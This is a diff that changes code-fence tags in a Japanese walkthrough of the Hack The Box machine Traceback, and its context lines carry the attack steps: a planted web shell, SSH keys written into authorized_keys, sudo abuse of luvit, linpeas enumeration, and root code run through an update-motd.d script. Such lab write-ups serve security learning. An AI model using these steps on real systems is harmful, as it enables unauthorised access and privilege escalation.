@@ -25,7 +25,7 @@ Linux マシンです。難易度は Easy です。
 
 まずどんなサービスが動いているか確認します。
 
-```
+```txt
 $ nmap -A 10.10.10.181
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 03:20 EDT
 Nmap scan report for 10.10.10.181
@@ -72,7 +72,7 @@ Nmap done: 1 IP address (1 host up) scanned in 29.72 seconds
 
 `smevk.php` で `user.txt` を入手したいですが、ログイン中のユーザではそれが無いです。
 
-```
+```txt
 $ ls -al /home/$(whoami)
 total 44
 drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 .
@@ -92,19 +92,19 @@ drwxrwxr-x 2 webadmin webadmin 4096 Feb 27 06:29 .ssh
 
 ますクライアントマシンでキーペア生成します。
 
-```
+```txt
 ssh-keygen -f ~/.ssh/traceback
 ```
 
 `smevk.php` のコンソールからこんな感じで生成した `~/.ssh/traceback.pub` をアップロードします。
 
-```
+```txt
 mkdir -p /home/webadmin/.ssh/ && echo "ssh-rsa xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx@xxxxxxxxxxxxxxxx" > /home/webadmin/.ssh/authorized_keys && cat /home/webadmin/.ssh/authorized_keys
 ```
 
 これで SSH すると無事に安定したシェルを得られます。
 
-```
+```txt
 $ ssh -i ~/.ssh/traceback webadmin@10.10.10.181
 #################################
 -------- OWNED BY XH4H  ---------
@@ -122,7 +122,7 @@ webadmin@traceback:~$
 先程の `ls` の結果を見つめ直すと `note.txt`, `.luvit_history` の興味深いファイルが見つかります。
 前者の内容は以下です。後者は空でした。
 
-```
+```txt
 $ cat /home/webadmin/note.txt
 - sysadmin -
 I have left a tool to practice Lua.
@@ -134,7 +134,7 @@ Lua の練習ツールを `sysadmin` が残してくれたらしいです。
 
 続いてホームディレクトリ内のファイルを順番に見ていると以下のような興味深い履歴が見つかります。
 
-```
+```txt
 $ cat /home/webadmin/.bash_history
 ls -la
 sudo -l
@@ -161,13 +161,13 @@ fs.writeFileSync('/home/sysadmin/.ssh/authorized_keys', pubkey)
 
 これを `.bash_history` に従って以下のように実行すると無事に正常終了します。
 
-```
+```txt
 sudo -u sysadmin /home/sysadmin/luvit privesc.lua
 ```
 
 これで `sysadmin` に `ssh` 出来るようになって `user.txt` が取れました！
 
-```
+```txt
 $ ssh -i ~/.ssh/traceback sysadmin@10.10.10.181
 #################################
 -------- OWNED BY XH4H  ---------
@@ -193,7 +193,7 @@ xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 クライアントマシンでダウンロード、 scp でターゲットマシンに送りつけます。
 ターゲットマシンで `curl` or `wget` が使えれば楽なのですが、 名前解決で失敗していたのでこうしています。
 
-```
+```txt
 wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
 chmod u+x linpeas.sh
 scp -i ~/.ssh/traceback linpeas.sh sysadmin@10.10.10.181:/home/sysadmin/linpeas.sh
@@ -201,7 +201,7 @@ scp -i ~/.ssh/traceback linpeas.sh sysadmin@10.10.10.181:/home/sysadmin/linpeas.
 
 実行すると以下の辺りが黄色くなっています。
 
-```
+```txt
 sysadmin@traceback:~$ ./linpeas.sh
 
 ... 省略 ...
@@ -223,7 +223,7 @@ sysadmin@traceback:~$ ./linpeas.sh
 `/etc/upated-motd.d` 以下はログイン時に出るバナーなどを実装しているシェルスクリプトのようです。
 root 権限で動作するらしいので、ここで `/root/root.xt` の表示を試みます。
 
-```
+```txt
 $ nano /etc/update-motd.d/00-header
 
 # cat /root/root.txt を追加
@@ -231,7 +231,7 @@ $ nano /etc/update-motd.d/00-header
 
 これで SSH し直すとバナーと一緒に `root.txt` も出力されます！
 
-```
+```txt
 $ ssh -i ~/.ssh/traceback sysadmin@10.10.10.181
 #################################
 -------- OWNED BY XH4H  ---------
